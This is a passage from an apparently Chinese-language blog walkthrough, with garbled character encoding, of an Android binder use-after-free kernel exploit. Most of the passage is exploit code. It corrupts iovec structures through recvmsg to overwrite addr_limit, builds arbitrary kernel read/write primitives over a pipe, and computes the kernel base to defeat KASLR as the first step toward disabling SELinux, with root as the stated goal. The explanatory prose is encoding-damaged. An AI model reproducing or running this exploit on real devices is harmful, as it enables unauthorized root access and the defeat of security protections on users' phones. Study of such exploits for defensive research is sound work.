&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Reallocate binder_thread as iovec array and
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// we need to make sure this recvmsg call blocks.
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// recvmsg will block after processing a valid iovec at
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// iovecStack[IOVEC_WQ_INDEX]
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kt">ssize_t&lt;/span> &lt;span class="n">nBytesReceived&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">recvmsg&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">sock_fd&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">message&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">MSG_WAITALL&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// If the corruption was successful, the total bytes received
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// should be equal to length of all iovec. This is because there
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// are three valid iovec
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kt">ssize_t&lt;/span> &lt;span class="n">expectedBytesReceived&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">iovecStack&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">IOVEC_WQ_INDEX&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">iov_len&lt;/span> &lt;span class="o">+&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">iovecStack&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">IOVEC_WQ_INDEX&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">iov_len&lt;/span> &lt;span class="o">+&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">iovecStack&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">IOVEC_WQ_INDEX&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">iov_len&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">nBytesReceived&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="n">expectedBytesReceived&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">ERR&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\t&lt;/span>&lt;span class="s">[-] recvmsg failed. nBytesReceived: 0x%lx, expected: 0x%lx&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">nBytesReceived&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">expectedBytesReceived&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">EXIT_FAILURE&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Wait for the child process to exit
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nf">wait&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">nullptr&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>è¿™é‡Œå°±è¦å°†addr_limitçš„å€¼æ”¹ä¸º&lt;code>0xFFFFFFFFFFFFFFFE&lt;/code>åœ¨arm64é‡Œæœ‰ä¸ªæ£€æŸ¥å‡½æ•°&lt;code>do_page_fault&lt;/code>ä¼šæ£€æµ‹è¯¥å€¼æ˜¯å¦ä¸º&lt;code>0xFFFFFFFFFFFFFFFF&lt;/code>ï¼Œå¦‚æœæ˜¯å°±è§¦å‘å¥”æºƒï¼Œæ‰€ä»¥ä¸€èˆ¬éƒ½è®¾ä¸º&lt;code>0xFFFFFFFFFFFFFFFE&lt;/code>ã€‚&lt;/p>
&lt;p>å‰é¢æ˜¯ä»å†…æ ¸è¯»å‡ºæ•°æ®ï¼Œè¿™é‡Œè¦å®ç°çš„æ˜¯å‘å†…æ ¸å†™å…¥æ•°æ®ã€‚&lt;/p>
&lt;p>çœ‹çœ‹è¿™é‡Œçš„iovecStackç»“æ„ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="n">iovecStack&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">IOVEC_WQ_INDEX&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">iov_base&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">m_4gb_aligned_page&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">iovecStack&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">IOVEC_WQ_INDEX&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">iov_len&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">iovecStack&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">IOVEC_WQ_INDEX&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">iov_base&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="mh">0x41414141&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">iovecStack&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">IOVEC_WQ_INDEX&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">iov_len&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x8&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mh">0x8&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mh">0x8&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mh">0x8&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">iovecStack&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">IOVEC_WQ_INDEX&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">iov_base&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="mh">0x42424242&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">iovecStack&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">IOVEC_WQ_INDEX&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">iov_len&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x8&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>å’Œå‰é¢æ³„éœ²ä¿¡æ¯çš„å¸ƒå±€æ˜¯å·®ä¸å¤šã€‚&lt;/p>
&lt;p>é¦–å…ˆä¾ç„¶æ˜¯åˆå§‹åŒ–ç¯å¢ƒï¼Œå…ˆå‘socketå†™å…¥äº†1byteçš„åƒåœ¾æ•°æ®ï¼Œä¹‹åçˆ¶è¿›ç¨‹ä½¿ç”¨&lt;code>recvmsg&lt;/code>ç³»ç»Ÿè°ƒç”¨æ¥æ”¶äº†1byteçš„æ•°æ®ä¹‹åè¿›è¡Œé˜»å¡ï¼Œè¿™é‡Œé€‰ç”¨äº†recvmsgè€Œä¸æ˜¯å‰é¢writevæ˜¯å› ä¸ºiovecStack[10].iov_lenå˜æˆäº†ä¸€ä¸ªæŒ‡é’ˆï¼Œå¾ˆå¤§çš„æ•°å­—ï¼Œåç»­è°ƒç”¨copy_page_to_iter_iovecå¤åˆ¶æ•°æ®æ—¶ä¼šå‡ºé”™ã€‚&lt;/p>
&lt;p>å­è¿›ç¨‹è¿›è¡Œunlinkæ“ä½œï¼Œå°†ç²¾å¿ƒæ„é€ çš„finalSocketDataå†™å…¥socketï¼Œçˆ¶è¿›ç¨‹æ¢å¤æ¥æ”¶æ•°æ®ï¼Œè¿™æ—¶iovecStack[11]å·²ç»è¢«ç ´åæ‰äº†ï¼Œç­‰åˆ°recvmsgç³»ç»Ÿè°ƒç”¨è¿”å›æ—¶ï¼Œå°±å¯ä»¥ä¿®æ”¹æ‰addr_limitçš„å€¼ã€‚&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="k">static&lt;/span> &lt;span class="kt">uint64_t&lt;/span> &lt;span class="n">finalSocketData&lt;/span>&lt;span class="p">[]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mh">0x1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="c1">// iovecStack[IOVEC_WQ_INDEX].iov_len
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="mh">0x41414141&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="c1">// iovecStack[IOVEC_WQ_INDEX + 1].iov_base
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="mh">0x8&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mh">0x8&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mh">0x8&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mh">0x8&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="c1">// iovecStack[IOVEC_WQ_INDEX + 1].iov_len
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">uint64_t&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="kt">uint8_t&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">m_task_struct&lt;/span> &lt;span class="o">+&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">OFFSET_TASK_STRUCT_ADDR_LIMIT&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="c1">// iovecStack[IOVEC_WQ_INDEX + 2].iov_base
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="mh">0xFFFFFFFFFFFFFFFE&lt;/span> &lt;span class="c1">// addr_limit value
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="p">};&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>å¯¹åº”ä¸Šé¢çš„å€¼ã€‚&lt;/p>
&lt;p>åˆ°è¿™é‡Œæˆ‘ä»¬å°±æœ‰äº†å®Œæ•´çš„å†…æ ¸è¯»å†™æƒé™ï¼Œæ¥ä¸‹ç»•è¿‡kaslrã€ç¦ç”¨SElinuxã€patchCredå°±å¯ä»¥è·å¾—rootæƒé™ã€‚&lt;/p>
&lt;h3 id="bypass-kaslr-and-disabling-selinux">bypass kaslr and Disabling SELinux&lt;/h3>
&lt;p>å‰é¢å·²ç»äº†æœ‰äº†å®Œæ•´çš„è¯»å†™æƒé™ï¼Œé‚£è¿™å°±å¾ˆç®€å•äº†ã€‚&lt;/p>
&lt;p>ä»»æ„è¯»å†™çš„å®ç°ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="kt">void&lt;/span> &lt;span class="n">BinderUaF&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="nf">kRead&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">Address&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">size_t&lt;/span> &lt;span class="n">Length&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">uBuffer&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">ssize_t&lt;/span> &lt;span class="n">nBytesWritten&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">write&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">m_kernel_rw_pipe_fd&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="n">Address&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">Length&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="kt">size_t&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">nBytesWritten&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="n">Length&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">ERR&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;[-] Failed to write data from kernel: %p&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">Address&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">EXIT_FAILURE&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">ssize_t&lt;/span> &lt;span class="n">nBytesRead&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">read&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">m_kernel_rw_pipe_fd&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="n">uBuffer&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">Length&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="kt">size_t&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">nBytesRead&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="n">Length&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">ERR&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;[-] Failed to read data from kernel: %p&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">Address&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">EXIT_FAILURE&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">void&lt;/span> &lt;span class="n">BinderUaF&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="nf">kWrite&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">Address&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">size_t&lt;/span> &lt;span class="n">Length&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">uBuffer&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">ssize_t&lt;/span> &lt;span class="n">nBytesWritten&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">write&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">m_kernel_rw_pipe_fd&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="n">uBuffer&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">Length&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="kt">size_t&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">nBytesWritten&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="n">Length&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">ERR&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;[-] Failed to write data from user: %p&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">Address&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">EXIT_FAILURE&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">ssize_t&lt;/span> &lt;span class="n">nBytesRead&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">read&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">m_kernel_rw_pipe_fd&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="n">Address&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">Length&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="kt">size_t&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">nBytesRead&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="n">Length&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">ERR&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;[-] Failed to write data to kernel: %p&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">Address&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">EXIT_FAILURE&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>ä»»æ„è¯»çš„è¯ï¼Œåˆ©ç”¨writeå’Œreadä¸¤ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œä½¿ç”¨writeå°†æ•°æ®å†™åˆ°pipeï¼Œå¹¶åœ¨ç®¡é“çš„å¦ä¸€ç«¯readä¸€ä¸ªå†…æ ¸åœ°å€ï¼Œå°±å¯ä»¥å°†æ•°æ®å†™å…¥è¯¥å†…æ ¸åœ°å€ã€‚ä»»æ„å†™çš„è¯ï¼Œä¸ä¹‹ç›¸åã€‚è¿™æ ·å°±å®ç°äº†ä»»æ„è¯»å†™ã€‚&lt;/p>
&lt;p>task_struct æœ‰ä¸€ä¸ªå…¨å±€æŒ‡é’ˆnsproxy ï¼Œå‰é¢å·²ç»æ³„éœ²å‡ºæ¥äº†ï¼Œå°±å¯ä»¥æ›´å…·åç§»ç›´æ¥ç®—å‡ºKernel_base_addrã€‚&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="kt">ptrdiff_t&lt;/span> &lt;span class="n">kernelBase&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">nsProxy&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="n">SYMBOL_OFFSET_init_nsproxy&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">auto&lt;/span> &lt;span class="n">selinuxEnforcing&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">kernelBase&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">SYMBOL_OFFSET_selinux_enforcing&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">INFO&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\t&lt;/span>&lt;span class="s">[*] nsproxy: 0x%lx&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">nsProxy&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">INFO&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\t&lt;/span>&lt;span class="s">[*] Kernel base: 0x%lx&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">kernelBase&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">INFO&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\t&lt;/span>&lt;span class="s">[*] selinux_enforcing: %p&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">selinuxEnforcing&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">selinuxEnabled&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">kReadDword&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">selinuxEnforcing&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="n">selinuxEnabled&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">INFO&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\t&lt;/span>&lt;span class="s">[*] selinux enforcing is disabled&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
